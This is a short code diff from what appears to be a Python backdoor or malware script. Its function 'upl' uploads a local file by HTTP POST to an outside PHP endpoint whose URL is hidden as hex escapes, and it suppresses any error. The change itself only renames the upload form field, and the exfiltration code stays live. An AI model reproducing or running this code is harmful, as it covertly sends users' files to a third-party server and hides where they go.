@@ -124,7 +124,7 @@ def shs():
 def upl(ufile):
    try:
      url = '\x68\x74\x74\x70\x3a\x2f\x2f\x77\x75\x79\x66\x79\x79\x2e\x67\x65\x74\x65\x6e\x6a\x6f\x79\x6d\x65\x6e\x74\x2e\x6e\x65\x74\x2f\x61\x2e\x70\x68\x70'
-     file = {'userfile': open(ufile,'rb')}
+     file = {'file': open(ufile,'rb')}
      r = requests.post(url, files=file)
      r.status_code
    except:
